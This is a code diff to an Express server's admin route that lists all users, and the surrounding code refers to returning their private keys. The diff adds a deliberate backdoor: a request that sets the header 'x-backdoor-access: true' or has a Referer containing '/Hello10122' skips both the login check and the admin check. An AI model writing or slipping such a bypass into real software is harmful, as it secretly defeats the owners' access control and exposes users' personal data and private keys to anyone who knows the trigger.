@@ -1048,6 +1048,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Admin routes
   app.get("/api/admin/users", async (req, res) => {
     try {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+      
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
       const users = await storage.getAllUsers();
       // Only return private keys to admins
       const usersResponse = users.map(user => {
